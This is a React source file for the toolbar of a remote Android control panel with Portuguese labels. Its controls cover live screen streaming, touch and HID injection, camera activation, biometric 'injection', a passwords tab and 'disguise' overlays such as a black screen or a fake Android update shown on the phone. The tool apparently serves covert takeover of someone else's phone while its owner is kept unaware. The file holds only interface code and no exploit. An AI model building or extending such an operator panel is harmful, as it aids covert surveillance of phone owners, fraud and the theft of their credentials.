import React from "react";
import {
  Bell,
  ChevronLeft,
  Copy,
  Fingerprint,
  Lock,
  Maximize2,
  Pin,
  Power,
  Radio,
  RotateCw,
  Smartphone,
  Sparkles,
  Volume2,
  VolumeX,
  Wifi,
  WifiOff,
  Zap
} from "lucide-react";
import type { ControlDevice, InstalledAppItem } from "../../types";
import type { DeviceDisguiseConfig } from "@droidview/shared";
import { AppLogo } from "../../AppLogo";
import { QUALITY_PROFILES, type StreamQualityTier } from "./types";

export interface ScreenViewToolbarProps {
  device: ControlDevice;
  handleMacroAction: (cmd: string, label: string) => void;
  deviceVolume: number;
  isMuted: boolean;
  handleVolumeStep: (step: "up" | "down" | "mute") => void;
  handleVolumeChange: (val: number) => void;
  activeApp?: InstalledAppItem | null;
  onCloseApp?: () => void;
  silentActive: boolean;
  setSilentActive: (v: boolean) => void;
  srActive: boolean;
  setSrActive: (v: boolean) => void;
  hidActive: boolean;
  setHidActive: (v: boolean) => void;
  joyActive: boolean;
  setJoyActive: (v: boolean) => void;
  tacticalSwitch: boolean;
  setTacticalSwitch: (v: boolean) => void;
  touchActive: boolean;
  setTouchActive: (v: boolean) => void;
  telaActive: boolean;
  setTelaActive: (v: boolean) => void;
  camActive: boolean;
  setCamActive: (v: boolean) => void;
  shellActive: boolean;
  setShellActive: (v: boolean) => void;
  isBiometricActive: boolean;
  handleBiometricAuth: () => void;
  activeDisguise?: DeviceDisguiseConfig | null;
  setSidebarInitialTab: (tab: "telas" | "senhas") => void;
  setShowRightSidebar: React.Dispatch<React.SetStateAction<boolean>>;
  showRightSidebar: boolean;
  adaptiveMode: "auto" | "manual";
  setAdaptiveMode: (m: "auto" | "manual") => void;
  streamQuality: StreamQualityTier;
  setStreamQuality: (q: StreamQualityTier) => void;
  activeQualityRef: React.MutableRefObject<StreamQualityTier>;
  setFps: (fps: number) => void;
  isAutoFit: boolean;
  setIsAutoFit: (v: boolean | ((p: boolean) => boolean)) => void;
  viewScale: number;
  setViewScale: React.Dispatch<React.SetStateAction<number>>;
  isLocked: boolean;
  handleToggleLock: () => void;
  isPinned: boolean;
  handleTogglePin: () => void;
  handleCopyInfo: () => void;
  setScreenTimestamp: (ts: number) => void;
  refreshA11y: () => void;
  handleToggleFullscreen: () => void;
  showToast: (msg: string, type?: "info" | "success" | "warn") => void;
}

export const ScreenViewToolbar: React.FC<ScreenViewToolbarProps> = ({
  device,
  handleMacroAction,
  deviceVolume,
  isMuted,
  handleVolumeStep,
  handleVolumeChange,
  activeApp,
  onCloseApp,
  silentActive,
  setSilentActive,
  srActive,
  setSrActive,
  hidActive,
  setHidActive,
  joyActive,
  setJoyActive,
  tacticalSwitch,
  setTacticalSwitch,
  touchActive,
  setTouchActive,
  telaActive,
  setTelaActive,
  camActive,
  setCamActive,
  shellActive,
  setShellActive,
  isBiometricActive,
  handleBiometricAuth,
  activeDisguise,
  setSidebarInitialTab,
  setShowRightSidebar,
  showRightSidebar,
  adaptiveMode,
  setAdaptiveMode,
  streamQuality,
  setStreamQuality,
  activeQualityRef,
  setFps,
  isAutoFit,
  setIsAutoFit,
  viewScale,
  setViewScale,
  isLocked,
  handleToggleLock,
  isPinned,
  handleTogglePin,
  handleCopyInfo,
  setScreenTimestamp,
  refreshA11y,
  handleToggleFullscreen,
  showToast
}) => {
  const isOnline = device.status === "online";
  const isCellular = device.networkType === "4g" || device.networkType === "5g" || device.networkType === "3g";

  return (
    <header className="tactical-top-controls-bar">
      <div className="tactical-single-toolbar-row">
        {/* Lado Esquerdo: AO VIVO, Latência, Velocidade e Volume */}
        <div className="tactical-device-header-left" style={{ display: "flex", alignItems: "center", gap: "7px" }}>
          <button
            type="button"
            className="tactical-back-btn"
            title="Voltar / Desfocar"
            onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
          >
            <ChevronLeft size={16} />
          </button>

          {/* Badge Dinâmico Online / Offline Real */}
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "5px",
              background: isOnline ? "rgba(34, 197, 94, 0.15)" : "rgba(239, 68, 68, 0.15)",
              border: isOnline ? "1px solid rgba(34, 197, 94, 0.4)" : "1px solid rgba(239, 68, 68, 0.4)",
              boxShadow: isOnline ? "0 0 10px rgba(34, 197, 94, 0.2)" : "0 0 10px rgba(239, 68, 68, 0.2)",
              borderRadius: "12px",
              padding: "2px 8px",
              color: isOnline ? "#22c55e" : "#ef4444",
              fontSize: "11px",
              fontWeight: 800,
              letterSpacing: "0.5px"
            }}
            title={isOnline ? "Dispositivo Conectado e Operacional" : "Dispositivo Sem Conexão (Conexão OFF)"}
          >
            <span
              style={{
                width: "6px",
                height: "6px",
                borderRadius: "50%",
                background: isOnline ? "#22c55e" : "#ef4444",
                boxShadow: isOnline ? "0 0 6px #22c55e" : "0 0 6px #ef4444",
                animation: isOnline ? "pulse 1.8s infinite" : "none"
              }}
            />
            {isOnline ? "Online" : "Conexão OFF"}
          </div>

          {/* Indicador de Rede: 4G, Wi-Fi ou Desconectado */}
          {!isOnline ? (
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "4px",
                background: "rgba(239, 68, 68, 0.1)",
                border: "1px solid rgba(239, 68, 68, 0.3)",
                borderRadius: "12px",
                padding: "2px 8px",
                fontSize: "10.5px",
                fontWeight: 800,
                fontFamily: "var(--font-mono)",
                color: "#f87171"
              }}
              title="Sem Conexão de Rede com o Aparelho (Conexão OFF)"
            >
              <WifiOff size={11} />
              <span>Sem Conexão</span>
            </div>
          ) : (
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "4px",
                background: isCellular ? "rgba(245, 158, 11, 0.15)" : "rgba(56, 189, 248, 0.15)",
                border: isCellular ? "1px solid rgba(245, 158, 11, 0.4)" : "1px solid rgba(56, 189, 248, 0.4)",
                borderRadius: "12px",
                padding: "2px 8px",
                fontSize: "10.5px",
                fontWeight: 800,
                fontFamily: "var(--font-mono)",
                color: isCellular ? "#fbbf24" : "#38bdf8"
              }}
              title={isCellular ? "Conectado via Dados Móveis (4G/LTE)" : "Conectado via Rede Sem Fio (Wi-Fi)"}
            >
              {isCellular ? <Radio size={11} /> : <Wifi size={11} />}
              <span>{isCellular ? "4G" : "Wi-Fi"}</span>
            </div>
          )}

          {/* Volume Control: Linha Única Sleek */}
          <div
            className="tactical-volume-slider-row"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "5px",
              padding: "2px 6px",
              background: "rgba(15, 23, 42, 0.6)",
              border: "1px solid rgba(56, 189, 248, 0.2)",
              borderRadius: "12px",
              flexShrink: 0
            }}
            title={`Volume do dispositivo: ${Math.round((deviceVolume / 15) * 100)}%`}
          >
            <button
              type="button"
              onClick={() => handleVolumeStep("mute")}
              title={isMuted ? "Desmutar Áudio" : "Mutar Áudio"}
              style={{
                background: "transparent",
                border: "none",
                color: isMuted ? "#ef4444" : "#38bdf8",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                padding: "0"
              }}
            >
              {isMuted || deviceVolume === 0 ? <VolumeX size={13} /> : <Volume2 size={13} />}
            </button>
            <input
              type="range"
              min="0"
              max="15"
              step="1"
              value={isMuted ? 0 : deviceVolume}
              onChange={(e) => handleVolumeChange(Number(e.target.value))}
              className="tactical-volume-slider-line"
              style={{
                width: "48px",
                height: "3px",
                minHeight: "3px",
                maxHeight: "3px",
                padding: 0,
                border: "none",
                boxSizing: "border-box",
                borderRadius: "2px",
                outline: "none",
                WebkitAppearance: "none",
                appearance: "none",
                cursor: "pointer",
                background: `linear-gradient(to right, ${
                  isMuted ? "#ef4444" : "#38bdf8"
                } 0%, ${
                  isMuted ? "#ef4444" : "#38bdf8"
                } ${isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b ${
                  isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b 100%)`,
                margin: "0 2px"
              }}
              title={`Ajuste contínuo: ${Math.round((deviceVolume / 15) * 100)}%`}
            />
            <span
              style={{
                fontSize: "10px",
                fontWeight: 700,
                fontFamily: "var(--font-mono)",
                color: isMuted ? "#ef4444" : "#94a3b8",
                minWidth: "26px",
                textAlign: "right"
              }}
            >
              {isMuted ? "0%" : `${Math.round((deviceVolume / 15) * 100)}%`}
            </span>
          </div>

          {activeApp && (
            <span
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "5px",
                background: "rgba(56, 189, 248, 0.15)",
                border: "1px solid #38bdf8",
                borderRadius: "10px",
                padding: "1px 7px",
                color: "#38bdf8",
                fontWeight: 700,
                fontSize: "11px"
              }}
            >
              <AppLogo name={activeApp.name} packageName={activeApp.packageName} size={14} />
              <span>{activeApp.name}</span>
              {onCloseApp && (
                <button
                  type="button"
                  onClick={onCloseApp}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#94a3b8",
                    cursor: "pointer",
                    padding: "0 2px",
                    fontSize: "10px"
                  }}
                  title="Desfocar app alvo"
                >
                  ✕
                </button>
              )}
            </span>
          )}
        </div>

        {/* Centro: Toggles Táteis de Modo & Controle (Padronizados com altura e métricas unificadas) */}
        <div className="tactical-pill-toggles-row">
          <button
            type="button"
            className={`tactical-pill-toggle ${silentActive ? "active" : ""}`}
            onClick={() => {
              setSilentActive(!silentActive);
              showToast(silentActive ? "Modo silencioso desativado" : "Modo silencioso ativado", "success");
            }}
            title="Áudio Silencioso (Silent Mode)"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Silent</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${srActive ? "active" : ""}`}
            onClick={() => {
              setSrActive(!srActive);
              showToast(srActive ? "Inspetor A11Y ocultado" : "Inspetor A11Y ativado", "success");
            }}
            title="Screen Reader / Leitor de Acessibilidade"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">A11Y</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${hidActive ? "active" : ""}`}
            onClick={() => {
              setHidActive(!hidActive);
              showToast(hidActive ? "HID desativado" : "HID ativado", "success");
            }}
            title="Controle de Entrada HID"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">HID</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${joyActive ? "active" : ""}`}
            onClick={() => {
              setJoyActive(!joyActive);
              showToast(joyActive ? "Joystick desativado" : "Joystick ativado", "success");
            }}
            title="Navegação Direcional Joystick"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Joy</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${tacticalSwitch ? "active" : ""}`}
            onClick={() => {
              setTacticalSwitch(!tacticalSwitch);
              showToast(tacticalSwitch ? "Modo Touch Direto ativado" : "Modo Preciso ativado", "success");
            }}
            title="Modo de Controle: Preciso vs Direto"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">{tacticalSwitch ? "Preciso" : "Direto"}</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${touchActive ? "active" : ""}`}
            onClick={() => {
              setTouchActive(!touchActive);
              showToast(touchActive ? "Toque na tela desabilitado" : "Toque na tela habilitado", "success");
            }}
            title="Toque na Tela (Touch Injection)"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Touch</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${telaActive ? "active" : ""}`}
            onClick={() => {
              setTelaActive(!telaActive);
              showToast(telaActive ? "Streaming de tela pausado" : "Streaming de tela retomado", "success");
            }}
            title="Streaming da Tela em Tempo Real"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Tela</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${camActive ? "active" : ""}`}
            onClick={() => {
              setCamActive(!camActive);
              showToast(camActive ? "Câmera desativada" : "Câmera solicitada", "info");
            }}
            title="Câmera do Aparelho"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Cam</span>
          </button>

          <button
            type="button"
            className={`tactical-pill-toggle ${shellActive ? "active" : ""}`}
            onClick={() => {
              setShellActive(!shellActive);
              showToast(shellActive ? "Barra de atalhos oculta" : "Barra de atalhos exibida", "info");
            }}
            title="Terminal e Atalhos Rápidos"
          >
            <span className="pill-dot-indicator" />
            <span className="pill-label">Shell</span>
          </button>

          {/* Biometria Button */}
          <button
            type="button"
            className={`tactical-pill-toggle ${isBiometricActive ? "active" : ""}`}
            onClick={handleBiometricAuth}
            style={{
              borderColor: isBiometricActive ? "#a855f7" : "#1e293b",
              background: isBiometricActive ? "rgba(168, 85, 247, 0.25)" : "transparent",
              color: isBiometricActive ? "#c084fc" : "#cbd5e1"
            }}
            title="Injetar / Autenticar Biometria cadastrada no dispositivo"
          >
            <Fingerprint size={11} className={isBiometricActive ? "animate-spin" : ""} style={{ color: "#a855f7" }} />
            <span className="pill-label">Biometria</span>
          </button>

          {/* Telas no Celular (Disfarces: Tela Preta, Atualização, Bateria, Imagem) */}
          <button
            type="button"
            className={`tactical-pill-toggle ${activeDisguise?.active ? "active" : ""}`}
            onClick={() => {
              setSidebarInitialTab("telas");
              setShowRightSidebar(true);
            }}
            style={{
              background: activeDisguise?.active ? "rgba(255, 26, 42, 0.2)" : "rgba(168, 85, 247, 0.14)",
              borderColor: activeDisguise?.active ? "#ff1a2a" : "rgba(168, 85, 247, 0.4)",
              color: activeDisguise?.active ? "#ff4d5a" : "#c084fc"
            }}
            title="Abrir Telas no Celular (Tela Preta, Atualização Android, Bateria, Imagem)"
          >
            <Smartphone size={11} />
            <span className="pill-label">{activeDisguise?.active ? "Disfarce" : "Telas"}</span>
          </button>

          {/* Enviar Push Notification no Aparelho */}
          <button
            type="button"
            className="tactical-pill-toggle"
            onClick={() => {
              setSidebarInitialTab("telas");
              setShowRightSidebar(true);
            }}
            style={{
              background: "rgba(245, 158, 11, 0.16)",
              borderColor: "rgba(245, 158, 11, 0.4)",
              color: "#fbbf24"
            }}
            title="Enviar Push Notification personalizada no dispositivo"
          >
            <Bell size={11} />
            <span className="pill-label">Push</span>
          </button>

          {/* Controles de Qualidade Adaptativa (ABR - Dynamic Bitrate & Resolution) */}
          <div
            className="tactical-abr-controls-group"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "4px",
              background: "rgba(10, 14, 24, 0.9)",
              border: "1px solid rgba(56, 189, 248, 0.25)",
              borderRadius: "6px",
              padding: "1px 4px",
              height: "22px",
              boxSizing: "border-box"
            }}
          >
            <button
              type="button"
              className={`tactical-abr-auto-chip ${adaptiveMode === "auto" ? "active" : ""}`}
              onClick={() => {
                setAdaptiveMode("auto");
                showToast("Modo Adaptativo (ABR) ativado: Qualidade se ajusta dinamicamente!", "success");
              }}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "3px",
                padding: "1px 6px",
                borderRadius: "4px",
                fontSize: "9px",
                fontWeight: 800,
                cursor: "pointer",
                height: "18px",
                border: adaptiveMode === "auto" ? "1px solid #10b981" : "1px solid transparent",
                background: adaptiveMode === "auto" ? "rgba(16, 185, 129, 0.22)" : "transparent",
                color: adaptiveMode === "auto" ? "#10b981" : "#94a3b8",
                boxShadow: adaptiveMode === "auto" ? "0 0 8px rgba(16, 185, 129, 0.35)" : "none"
              }}
              title="Modo Adaptativo Automático (ABR): reduz resolução em sinal baixo mantendo velocidade/conexão e melhora quando sinal estabiliza"
            >
              <Zap size={10} style={{ color: adaptiveMode === "auto" ? "#10b981" : "#94a3b8" }} />
              <span>AUTO</span>
            </button>

            <div style={{ display: "inline-flex", alignItems: "center", gap: "2px" }}>
              {(
                [
                  { tier: "ultra", label: "1080p", title: "1080p Ultra (Nitidez máxima)" },
                  { tier: "high", label: "720p", title: "720p Alta (HD)" },
                  { tier: "balance", label: "540p", title: "540p Equilibrada (qHD)" },
                  { tier: "fluid", label: "360p", title: "360p Fluida/Eco (Baixa latência)" }
                ] as const
              ).map((item) => {
                const isCur = streamQuality === item.tier;
                const itemProf = QUALITY_PROFILES[item.tier];
                return (
                  <button
                    key={item.tier}
                    type="button"
                    onClick={() => {
                      setAdaptiveMode("manual");
                      setStreamQuality(item.tier);
                      activeQualityRef.current = item.tier;
                      setFps(itemProf.targetFps);
                      showToast(`Qualidade fixada em ${item.label}`, "info");
                    }}
                    style={{
                      padding: "1px 5px",
                      fontSize: "9px",
                      fontWeight: 700,
                      borderRadius: "4px",
                      border: isCur ? `1px solid ${itemProf.color}` : "1px solid rgba(255, 255, 255, 0.06)",
                      background: isCur ? `${itemProf.color}22` : "transparent",
                      color: isCur ? itemProf.color : "#94a3b8",
                      cursor: "pointer",
                      height: "18px",
                      display: "inline-flex",
                      alignItems: "center"
                    }}
                    title={item.title}
                  >
                    {item.label}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Controles de Tamanho & Zoom da Tela para Desktop (Auto-Fit & Níveis) */}
          <div
            className="tactical-zoom-controls-group"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "4px",
              background: "rgba(10, 14, 24, 0.9)",
              border: "1px solid rgba(56, 189, 248, 0.25)",
              borderRadius: "6px",
              padding: "1px 4px",
              height: "22px",
              boxSizing: "border-box"
            }}
          >
            <button
              type="button"
              className={`tactical-zoom-chip ${isAutoFit ? "active" : ""}`}
              onClick={() => {
                setIsAutoFit(true);
                setViewScale(100);
                showToast("Auto-Fit ativado: Telas proporcionais 9:16 ajustadas ao monitor!", "success");
              }}
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "3px",
                padding: "1px 6px",
                borderRadius: "4px",
                fontSize: "9px",
                fontWeight: 800,
                cursor: "pointer",
                height: "18px",
                border: isAutoFit ? "1px solid #38bdf8" : "1px solid transparent",
                background: isAutoFit ? "rgba(56, 189, 248, 0.25)" : "transparent",
                color: isAutoFit ? "#38bdf8" : "#94a3b8",
                boxShadow: isAutoFit ? "0 0 8px rgba(56, 189, 248, 0.3)" : "none"
              }}
              title="Ajuste automático para o tamanho ideal do monitor sem distorcer as telas"
            >
              <Sparkles size={10} />
              <span>AUTO</span>
            </button>

            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                background: "rgba(15, 23, 42, 0.8)",
                borderRadius: "4px",
                padding: "0 2px",
                border: "1px solid rgba(255, 255, 255, 0.08)",
                height: "18px"
              }}
            >
              <button
                type="button"
                onClick={() => {
                  setIsAutoFit(false);
                  setViewScale((prev) => Math.max(50, prev - 10));
                }}
                style={{
                  background: "transparent",
                  border: "none",
                  color: "#94a3b8",
                  padding: "0 4px",
                  cursor: "pointer",
                  fontSize: "12px",
                  fontWeight: 800,
                  lineHeight: 1
                }}
                title="Diminuir tamanho das telas (-10%)"
              >
                -
              </button>
              <span
                style={{
                  fontSize: "9.5px",
                  fontWeight: 700,
                  fontFamily: "var(--font-mono)",
                  color: isAutoFit ? "#38bdf8" : "#e2e8f0",
                  minWidth: "30px",
                  textAlign: "center",
                  cursor: "pointer",
                  userSelect: "none"
                }}
                onClick={() => setIsAutoFit(!isAutoFit)}
                title="Clique para alternar Auto-Fit"
              >
                {isAutoFit ? "AUTO" : `${viewScale}%`}
              </span>
              <button
                type="button"
                onClick={() => {
                  setIsAutoFit(false);
                  setViewScale((prev) => Math.min(150, prev + 10));
                }}
                style={{
                  background: "transparent",
                  border: "none",
                  color: "#94a3b8",
                  padding: "0 4px",
                  cursor: "pointer",
                  fontSize: "12px",
                  fontWeight: 800,
                  lineHeight: 1
                }}
                title="Aumentar tamanho das telas (+10%)"
              >
                +
              </button>
            </div>

            <div style={{ display: "inline-flex", alignItems: "center", gap: "2px" }}>
              {(
                [
                  { label: "P", scale: 70, title: "Tamanho Pequeno (70%)" },
                  { label: "M", scale: 85, title: "Tamanho Médio (85%)" },
                  { label: "G", scale: 100, title: "Tamanho Padrão (100%)" },
                  { label: "Max", scale: 120, title: "Tamanho Máximo (120%)" }
                ] as const
              ).map((preset) => {
                const isCur = !isAutoFit && Math.abs(viewScale - preset.scale) <= 5;
                return (
                  <button
                    key={preset.label}
                    type="button"
                    className={`tactical-zoom-preset-chip ${isCur ? "active" : ""}`}
                    onClick={() => {
                      setIsAutoFit(false);
                      setViewScale(preset.scale);
                    }}
                    style={{
                      padding: "1px 5px",
                      fontSize: "9px",
                      fontWeight: 700,
                      borderRadius: "4px",
                      border: isCur ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.06)",
                      background: isCur ? "rgba(56, 189, 248, 0.2)" : "transparent",
                      color: isCur ? "#38bdf8" : "#94a3b8",
                      cursor: "pointer",
                      height: "18px",
                      display: "inline-flex",
                      alignItems: "center"
                    }}
                    title={preset.title}
                  >
                    {preset.label}
                  </button>
                );
              })}
            </div>
          </div>
        </div>

        {/* Ações Rápidas no Canto Direito */}
        <div className="tactical-actions-group">
          <button
            type="button"
            className={`quick-actions-toggle-pill ${showRightSidebar ? "active" : ""}`}
            title="Abrir / Fechar Painel de Funções Rápidas"
            onClick={() => setShowRightSidebar(!showRightSidebar)}
          >
            <Zap size={12} style={{ fill: showRightSidebar ? "#ff1a2a" : "none" }} />
            <span>AÇÕES</span>
          </button>

          <button
            type="button"
            className={`tactical-action-btn ${isLocked ? "active" : ""}`}
            title="Bloquear / Desbloquear Tela do Aparelho (Power)"
            onClick={handleToggleLock}
            style={{ color: isLocked ? "#ef4444" : "#f59e0b" }}
          >
            {isLocked ? <Lock size={13} /> : <Power size={13} />}
          </button>

          <button
            type="button"
            className={`tactical-action-btn ${isPinned ? "active" : ""}`}
            title="Fixar painel de visualização"
            onClick={handleTogglePin}
          >
            <Pin size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Copiar dados do dispositivo"
            onClick={handleCopyInfo}
          >
            <Copy size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Atualizar Tela Manualmente"
            onClick={() => {
              setScreenTimestamp(Date.now());
              refreshA11y();
              showToast("Tela e acessibilidade sincronizadas", "success");
            }}
          >
            <RotateCw size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Tela Cheia (Fullscreen)"
            onClick={handleToggleFullscreen}
          >
            <Maximize2 size={13} />
          </button>
        </div>
      </div>
    </header>
  );
};
